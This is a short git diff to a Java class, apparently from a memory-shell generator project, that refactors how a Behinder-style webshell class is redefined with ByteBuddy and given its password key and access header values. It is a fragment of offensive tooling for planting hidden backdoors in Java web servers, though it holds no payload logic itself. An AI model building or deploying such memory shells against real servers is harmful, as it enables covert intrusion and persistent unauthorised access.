@@ -2,6 +2,7 @@ package com.reajason.javaweb.memshell.generator;
 
 import com.reajason.javaweb.memshell.config.BehinderConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
+import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.codec.digest.DigestUtils;
 
@@ -16,9 +17,12 @@ public class BehinderGenerator extends ByteBuddyShellGenerator<BehinderConfig> {
         super(shellConfig, shellToolConfig);
     }
 
-    public DynamicType.Builder<?> build(DynamicType.Builder<?> builder) {
+    @Override
+    public DynamicType.Builder<?> getBuilder() {
         String md5Key = DigestUtils.md5Hex(shellToolConfig.getPass()).substring(0, 16);
-        return builder.field(named("pass")).value(md5Key)
+        return new ByteBuddy()
+                .redefine(shellToolConfig.getShellClass())
+                .field(named("pass")).value(md5Key)
                 .field(named("headerName")).value(shellToolConfig.getHeaderName())
                 .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
     }
